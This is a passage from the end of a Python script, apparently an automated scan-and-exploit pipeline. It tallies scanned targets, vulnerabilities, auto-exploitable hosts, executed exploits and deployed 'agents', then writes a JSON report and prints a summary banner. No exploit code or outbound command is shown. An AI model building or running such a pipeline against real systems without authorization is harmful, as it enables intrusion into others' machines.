    RESULTS['summary'] = {
        'targets_scanned': RESULTS['targets_scanned'],
        'services_found': len(all_services),
        'vulnerabilities_found': len(all_vulns),
        'auto_exploitable': len(exploitable),
        'agents_deployed': len(RESULTS['agents_deployed']),
        'successful_exploits': len([d for d in deployed if d.get('success')]),
        'local_agents': len(local_agents)
    }
    
    # Save full report
    report_path = f'{FINDINGS}/pipeline_v2_{RUN_ID}.json'
    with open(report_path, 'w') as f:
        json.dump(RESULTS, f, indent=2, default=str)
    
    latest = f'{FINDINGS}/latest_pipeline.json'
    with open(latest, 'w') as f:
        json.dump(RESULTS, f, indent=2, default=str)
    
    s = RESULTS['summary']
    print(f"""
╔══════════════════════════════════════════════════════════╗
║              PIPELINE v2 COMPLETE — RESULTS              ║
╠══════════════════════════════════════════════════════════╣
║  Targets Scanned:      {s['targets_scanned']:<34}║
║  Services Found:       {s['services_found']:<34}║
║  Vulnerabilities:      {s['vulnerabilities_found']:<34}║
║  Auto-Exploitable:     {s['auto_exploitable']:<34}║
║  Exploits Executed:    {len(deployed):<34}║
║  Successful Deploys:   {s['successful_exploits']:<34}║
║  Local Agents:         {s['local_agents']:<34}║
║  Total Agents Active:  {s['agents_deployed']:<34}║
╠══════════════════════════════════════════════════════════╣
║  Report: {report_path:<49}║
╚══════════════════════════════════════════════════════════╝
""")
    
    log(f"Pipeline complete. Report: {report_path}", "SUCCESS")
    return RESULTS

if __name__ == '__main__':
    main()